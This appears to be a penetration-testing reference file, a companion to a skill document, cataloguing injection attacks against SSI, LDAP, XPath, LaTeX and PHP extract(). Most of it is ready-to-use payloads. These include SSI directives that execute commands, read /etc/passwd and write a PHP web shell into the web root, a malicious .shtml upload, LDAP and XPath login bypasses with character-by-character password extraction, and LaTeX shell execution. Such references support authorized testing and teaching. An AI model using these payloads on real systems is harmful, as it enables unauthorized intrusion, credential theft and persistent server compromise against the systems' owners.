# Extra Injection Types — SSI, LDAP, XPath

> Companion to [SKILL.md](./SKILL.md). Covers injection types that are less common in modern web apps but still appear in specific technology stacks.

---

## 1. SSI Injection (Server-Side Includes)

### Mechanism

SSI directives are parsed by the web server (Apache, Nginx, IIS) before sending the response. If user input is embedded in `.shtml` or SSI-enabled pages without sanitization:

```
<!--#exec cmd="id"-->
<!--#include virtual="/etc/passwd"-->
```

### Detection

```text
# Probe: inject SSI directive in form field, URL param, or header:
<!--#echo var="DATE_LOCAL"-->

# If response contains the current date → SSI is active and input is parsed

# Confirm command execution:
<!--#exec cmd="id"-->
```

### Prerequisites

- Apache with `mod_include` and `Options +Includes`
- File extension `.shtml` or `AddOutputFilter INCLUDES .html`
- Nginx with `ssi on;` in location block
- IIS with SSI feature installed

### Key Payloads

```text
# Command execution:
<!--#exec cmd="id"-->
<!--#exec cmd="cat /etc/passwd"-->
<!--#exec cmd="ls -la"-->

# File include:
<!--#include virtual="/etc/passwd"-->
<!--#include file="config.php"-->

# Variable echo (safe probe):
<!--#echo var="DOCUMENT_ROOT"-->
<!--#echo var="SERVER_SOFTWARE"-->
<!--#echo var="REMOTE_ADDR"-->

# Chained with file write:
<!--#exec cmd="echo '<?php system($_GET[c]);?>' > /var/www/html/shell.php"-->
```

### Real-World Case: SSI via File Upload

Upload a file named `shell.shtml` with SSI directives:
```text
<!--#exec cmd="whoami"-->
```

If the web server processes `.shtml` files → command executes on page load.

### Where to Test

- Guest books, comment systems, forums
- Error pages that include user input
- Any `.shtml` endpoint accepting user data
- File upload → upload `.shtml` file with SSI directives

---

## 2. LDAP Injection

### Mechanism

LDAP queries use a filter syntax. When user input is concatenated into filters without sanitization:

```
Original:  (&(uid=USER_INPUT)(password=PASS_INPUT))
Injection: (&(uid=admin)(|(password=*)(1=1)))(password=anything))
```

### Detection

```text
# Authentication bypass — classic:
Username: admin)(&)
Password: anything
# Filter becomes: (&(uid=admin)(&))(password=anything))
# The (&) always evaluates to TRUE

# OR injection:
Username: *)(uid=*))(|(uid=*
Password: anything
# Lists all users
```

### Common Filter Patterns

```text
# Search filter: (&(cn=INPUT)(objectClass=person))
# Auth filter:   (&(uid=INPUT)(userPassword=INPUT2))

# Metacharacters:
*   — wildcard (matches anything)
()  — grouping
&   — AND
|   — OR
!   — NOT
```

### Exploitation Scenarios

#### Authentication Bypass — Null Byte Truncation

```text
# When passwords are hashed (common in OpenLDAP):
Username: admin%00                 # URL-encoded null byte
# In Burp, change %2500 to %00 (actual null byte)
# LDAP query: (&(uid=admin\00)(userPassword=...))
# Null byte truncates the filter → password check skipped
```

#### Authentication Bypass — Wildcard and Logic

```text
# Simple wildcard:
Username: *
Password: *
# If filter: (&(uid=*)(userPassword=*)) → matches ALL entries

# Logic closure:
Username: zhang)(|(&
Password: 1
# Filter becomes: (&(uid=zhang)(|(&)(userpassword=1))) → always TRUE
```

#### Data Extraction via Wildcard

```text
# Enumerate attributes character by character:
(&(uid=admin)(password=a*))  → invalid → password doesn't start with 'a'
(&(uid=admin)(password=b*))  → invalid
(&(uid=admin)(password=s*))  → valid! → password starts with 's'
(&(uid=admin)(password=se*)) → valid! → second char is 'e'
...
# Continue until full password is extracted
```

---

## 3. XPath Injection

### Mechanism

XPath queries navigate XML documents. When user input enters XPath expressions:

```xml
<!-- XML data store: -->
<users>
  <user><name>admin</name><password>s3cret</password><role>admin</role></user>
  <user><name>guest</name><password>guest</password><role>user</role></user>
</users>
```

```
Original query:  //user[name='INPUT' and password='INPUT2']
Injection:       //user[name='admin' or '1'='1' and password='anything' or '1'='1']
```

### Authentication Bypass

```text
Username: admin' or '1'='1
Password: anything' or '1'='1
# Query: //user[name='admin' or '1'='1' and password='anything' or '1'='1']
# Always matches → returns first user (usually admin)
```

### Blind XPath Injection — Step-by-Step

```text
# Confirm root structure:
' or count(/)=1 and '1'='1              # always TRUE
' or count(/*)=1 and '1'='1             # check number of root element children

# Extract password character by character:
' or string-length(//user[1]/password)=6 or '1'='2
' or substring(//user[1]/password,1,1)='s' or '1'='2  # 1st char
' or substring(//user[1]/password,2,1)='e' or '1'='2  # 2nd char
```

### Useful XPath Functions

```text
string-length(string)          → length of string
substring(string, pos, len)    → extract substring
count(node-set)                → count nodes
name(node)                     → element name
contains(str, substr)          → boolean contains check
starts-with(str, prefix)       → boolean prefix check
```

---

## 4. LaTeX Injection

When applications compile user-provided LaTeX (thesis generators, PDF report builders):

### File Read

```latex
\input{/etc/passwd}
\include{/etc/passwd}
\lstinputlisting{/etc/passwd}
```

### Command Execution (requires --shell-escape)

```latex
\immediate\write18{id > /tmp/output.txt}
\input{/tmp/output.txt}
```

---

## 5. Encoding Transformation Bypass

### Unicode Normalization

```text
# NFKC normalizes fullwidth chars: A (U+FF21) → "A"
# Attack: Register "admin" (fullwidth) → normalizes to "admin" after filter check
```

### Double Encoding

```text
%252e%252e%252f  → %2e%2e%2f (after first decode) → ../ (after second decode)
# WAF decodes once but app decodes twice → filter bypass
```

---

## 6. PHP External Variable Modification

### extract() Variable Overwrite

```php
// Vulnerable:
extract($_GET);
// Attacker: ?auth=true&is_admin=1
// Now $auth = "true" and $is_admin = "1" in scope

// Combined with include:
extract($_GET);
include($template . ".php");
// Attacker: ?template=../../../../etc/passwd%00
```

### Detection

```text
# Look for:
# - extract($_GET), extract($_POST), extract($_REQUEST)
# - parse_str($query) without second parameter
# - import_request_variables() (removed PHP 5.4)
# - $$variable (variable variables with user input)
```
